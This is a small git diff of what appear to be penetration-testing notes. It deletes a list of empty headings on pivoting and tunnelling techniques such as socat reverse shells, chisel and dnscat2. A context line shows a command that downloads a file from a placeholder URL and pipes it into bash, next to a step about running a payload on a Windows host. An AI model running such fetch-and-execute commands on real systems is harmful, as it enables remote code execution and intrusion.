@@ -642,21 +642,5 @@ wget -q0- <Target File URL> | bash
   ```
   4. Execute the payload on the windows host.
   
-  
-  
-  
-  
-#### Socat Redirection with a Reverse Shell
-#### Socat Redirection with a Bind Shell
-#### SSH for Windows with plink.exe
-#### SSH Pivoting with sshuttle
-#### Webserver Pivoting with Rpivot
-#### Port Forwarding with Windows: Netsh
-#### DNS TUnneling iwth DNSCAT2
-#### SOCKS5 Tunneling with Chisel
-#### ICMP Tunneling with SOCKS
-#### RDP and SOCKS Tunneling with SocksOverRDP
-
-  
 
 ## Testing the Top 10 Web Application Vulnerabilities
